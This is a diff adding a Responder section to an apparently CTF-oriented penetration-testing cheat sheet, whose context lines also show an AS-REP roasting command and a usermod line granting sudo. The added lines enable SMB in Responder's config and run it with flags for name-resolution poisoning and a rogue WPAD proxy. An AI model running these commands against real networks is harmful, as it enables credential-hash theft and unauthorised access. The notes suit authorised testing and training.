@@ -196,3 +196,14 @@ python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_resp
 ```console
 $ usermod -aG sudo [user] # adds a user to the Sudo Group on Linux:
 ```
+
+## responder
+```console
+$ cat /etc/responder/Responder.conf | grep SMB #if OFF change to ON
+SMB = ON 
+$ sudo responder -I tun0 -rdw -v
+```
+- r: switch enables netbios wredir suffix queries
+- d: switch enables netbios domain suffix querie
+- w: switch starts the wpad rogue proxy server
+- v: verbose
